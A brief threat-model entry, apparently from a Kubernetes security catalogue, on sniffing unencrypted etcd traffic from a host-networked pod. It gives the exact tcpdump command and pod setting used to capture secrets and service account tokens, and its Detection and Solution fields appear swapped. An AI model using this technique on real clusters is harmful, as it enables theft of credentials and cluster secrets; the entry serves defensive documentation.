- **Scenario**: Container with --network=host uses tcpdump to sniff etcd plaintext traffic.
- **Attack Steps**: Attacker deploys a pod with `hostNetwork: true`, and inside it runs `tcpdump -i any port 2379` to monitor etcd traffic. Since etcd is often configured without TLS, secrets and config values are visible in plaintext. Used to harvest cluster secrets, service account tokens, or K8s object data.
- **Detection**: Enforce etcd TLS encryption; restrict hostNetwork to infra pods
- **Solution**: Monitor use of tcpdump or similar tools in pods
- **Tags**: #etcd #networksniff #plaintextsecrets #kubernetes

